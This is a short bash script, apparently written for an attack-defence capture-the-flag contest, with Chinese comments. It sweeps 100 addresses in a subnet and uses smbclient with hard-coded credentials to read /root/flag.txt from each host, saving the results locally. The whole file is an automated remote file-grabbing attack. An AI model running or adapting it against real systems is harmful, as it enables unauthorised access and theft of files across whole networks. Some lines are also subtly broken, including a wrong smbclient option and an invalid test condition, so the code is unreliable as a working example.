#!/bin/bash

echo 'auto smb'

echo -n 'IP :'

read IP

echo -n 'dir :'

read ddir
echo '生成IP中...'
for((i=1;i<=100;i++))
do
	ip_array[$i]=$IP.$i
#	echo '生成IP：'
	echo ${ip_array[$i]}
done
num=1
#echo 'SMB获取FLAG'
for client_ip in ${ip_array[*]}
do
	smbclient -C "cat /root/flag.txt" >/home/feiyi/$num.txt //$client_ip/$ddir -U username%password
	if [ $? -eq=0 ];then
		let num++
	else
		echo '链接失败next...'
		continue
	fi

done



